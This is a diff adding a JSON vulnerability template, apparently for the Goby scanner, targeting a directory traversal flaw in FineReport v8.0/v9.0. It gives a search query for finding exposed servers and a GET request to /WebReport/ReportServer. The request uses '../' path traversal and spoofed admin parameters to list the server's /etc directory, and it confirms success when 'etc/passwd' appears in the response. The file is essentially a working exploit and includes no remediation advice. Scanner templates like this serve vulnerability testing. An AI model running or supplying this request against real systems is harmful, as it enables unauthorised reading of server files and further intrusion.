@@ -1,0 +1,92 @@
+{
+      "Name": "FineReport v8.0/v9.0 Directory Traversal",
+      "Level": "1",
+      "Tags": [
+            "Directory Traversal"
+      ],
+      "GobyQuery": "body=\"/WebReport/ReportServer\"",
+      "Description": "FineReport report software is an enterprise-level web report tool written in pure Java, which integrates data display (report) and data entry (form) functions.",
+      "Product": "FineReport v8.0/v9.0",
+      "Homepage": "https://www.fanruan.com/",
+      "Author": "",
+      "Impact": "FineReport v8.0/v9.0 Directory Traversal.",
+      "Recommendation": "",
+      "References": [],
+      "HasExp": true,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/WebReport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../../../../../../../../../../../../etc&currentUserName=admin&currentUserId=1&isWebReport=true",
+                        "follow_redirect": false,
+                        "header": null,
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "etc/passwd",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/WebReport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../../../../../../../../../../../../etc&currentUserName=admin&currentUserId=1&isWebReport=true",
+                        "follow_redirect": false,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "etc/passwd",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
